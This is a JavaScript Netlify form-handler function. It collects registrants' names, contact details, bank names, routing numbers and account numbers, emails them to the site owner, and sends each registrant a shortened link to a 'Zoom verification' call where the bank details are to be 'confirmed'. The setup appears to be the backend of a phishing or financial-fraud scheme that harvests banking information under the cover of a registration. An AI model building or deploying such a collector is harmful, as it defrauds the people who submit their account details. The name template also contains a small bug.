// Runs automatically on every Netlify Forms submission (function name must stay "submission-created").
const nodemailer = require("nodemailer");

// ---- Edit this once you generate the real Zoom link ----
const ZOOM_LINK = "https://ln.run/zoom%F0%9F%92%93";
// --------------------------------------------------------

const FORM_NAME = "registration";

// Escape user-entered text before placing it in HTML.
function esc(value) {
  return String(value ?? "")
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#39;");
}

function buildRows(d) {
  return [
    ["Name", `${d.firstName} {$d.middleInitial} ${d.lastName}`],
    ["Email", d.email],
    ["Phone", d.phone],
    ["ZIP code", d.zipcode],
    ["Bank name", d.bank],
    ["Routing No.", d.RoutingNo],
    ["Account No", d.AccountNo],
  ];
}

function rowsHtml(rows) {
  return rows
    .map(
      ([label, value]) => `
        <tr>
          <td style="padding:8px 12px;border-bottom:1px solid #dfe1e2;font-weight:600;color:#565c65;width:40%;">${esc(label)}</td>
          <td style="padding:8px 12px;border-bottom:1px solid #dfe1e2;color:#1b1b1b;">${esc(value)}</td>
        </tr>`
    )
    .join("");
}

function rowsText(rows) {
  return rows.map(([label, value]) => `${label}: ${value}`).join("\n");
}

function registrantEmail(d) {
  const rows = buildRows(d);

  const html = `
  <div style="background:#f5f5f5;padding:24px;font-family:Arial,Helvetica,sans-serif;">
    <div style="max-width:600px;margin:auto;background:#ffffff;border:1px solid #dfe1e2;border-radius:6px;padding:28px;">
      <h1 style="margin:0 0 12px;font-size:22px;color:#162e51;">Registration received</h1>
      <p style="margin:0 0 16px;color:#1b1b1b;line-height:1.5;">
        Hello ${esc(d.firstName)}, thank you for registering. We have received the following information:
      </p>

      <table role="presentation" cellpadding="0" cellspacing="0" style="width:100%;border:1px solid #dfe1e2;border-collapse:collapse;font-size:14px;">
        ${rowsHtml(rows)}
      </table>

      <h2 style="margin:28px 0 8px;font-size:18px;color:#162e51;">Next step: Zoom verification</h2>
      <p style="margin:0 0 16px;color:#1b1b1b;line-height:1.5;">
        Please join the Zoom meeting below to complete your verification. Have the details you entered above ready,
        as they will be confirmed during the call.
      </p>

      <p style="margin:0 0 16px;">
        <a href="${esc(ZOOM_LINK)}"
           style="display:inline-block;background:#1a4480;color:#ffffff;text-decoration:none;font-weight:700;padding:12px 24px;border-radius:4px;">
          Join Zoom meeting
        </a>
      </p>

      <p style="margin:0 0 4px;color:#565c65;font-size:13px;">
        If the button does not work, copy and paste this link into your browser:
      </p>
      <p style="margin:0 0 20px;font-size:13px;word-break:break-all;">
        <a href="${esc(ZOOM_LINK)}" style="color:#1a4480;">${esc(ZOOM_LINK)}</a>
      </p>

      <p style="margin:0;color:#565c65;font-size:12px;">
        If you did not submit this registration, you can ignore this email.
      </p>
    </div>
  </div>`;

  const text = `Hello ${d.firstName},

Thank you for registering. We have received the following information:

${rowsText(rows)}

NEXT STEP: ZOOM VERIFICATION
Please join the Zoom meeting to complete your verification. Have the details above ready, as they will be confirmed during the call.

Zoom link: ${ZOOM_LINK}

If you did not submit this registration, you can ignore this email.`;

  return { html, text };
}

function ownerEmail(d) {
  const rows = buildRows(d);

  const html = `
  <div style="font-family:Arial,Helvetica,sans-serif;max-width:600px;">
    <h2 style="color:#162e51;">New registration</h2>
    <table role="presentation" cellpadding="0" cellspacing="0" style="width:100%;border:1px solid #dfe1e2;border-collapse:collapse;font-size:14px;">
      ${rowsHtml(rows)}
    </table>
    <p style="color:#565c65;font-size:13px;">The registrant was sent the acknowledgement and Zoom link.</p>
  </div>`;

  const text = `New registration\n\n${rowsText(rows)}\n\nThe registrant was sent the acknowledgement and Zoom link.`;

  return { html, text };
}

exports.handler = async (event) => {
  try {
    const payload = JSON.parse(event.body).payload || {};
    const d = payload.data || {};

    // Only handle our form.
    if (payload.form_name && payload.form_name !== FORM_NAME) {
      return { statusCode: 200, body: "Ignored: different form." };
    }

    // Skip honeypot (spam) submissions.
    if (d["bot-field"]) {
      return { statusCode: 200, body: "Ignored: spam." };
    }

    if (!d.email) {
      console.error("Submission has no email address.");
      return { statusCode: 200, body: "No email provided." };
    }

    const { GMAIL_USER, GMAIL_APP_PASSWORD } = process.env;
    if (!GMAIL_USER || !GMAIL_APP_PASSWORD) {
      console.error("Missing GMAIL_USER or GMAIL_APP_PASSWORD environment variable.");
      return { statusCode: 500, body: "Email is not configured." };
    }

    const COPY_TO = process.env.COPY_TO || GMAIL_USER;
    const fromName = process.env.FROM_NAME || "Registration Portal";
    const from = `"${fromName}" <${GMAIL_USER}>`;

    const transporter = nodemailer.createTransport({
      host: "smtp.gmail.com",
      port: 465,
      secure: true,
      auth: { user: GMAIL_USER, pass: GMAIL_APP_PASSWORD },
    });

    const reg = registrantEmail(d);
    const own = ownerEmail(d);

    // Send both independently so one failure doesn't block the other.
    const results = await Promise.allSettled([
      transporter.sendMail({
        from,
        to: d.email,
        replyTo: COPY_TO,
        subject: "Registration received: next step is your Zoom verification",
        text: reg.text,
        html: reg.html,
      }),
      transporter.sendMail({
        from,
        to: COPY_TO,
        subject: `New registration: ${String(d.firstName || "").trim()} ${String(d.lastName || "").trim()}`.trim(),
        text: own.text,
        html: own.html,
      }),
    ]);

    results.forEach((r, i) => {
      const label = i === 0 ? "registrant email" : "owner copy";
      if (r.status === "rejected") {
        console.error(`Failed to send ${label}:`, r.reason);
      } else {
        console.log(`Sent ${label}.`);
      }
    });

    return { statusCode: 200, body: "Done." };
  } catch (err) {
    console.error("submission-created error:", err);
    return { statusCode: 500, body: "Error." };
  }
};
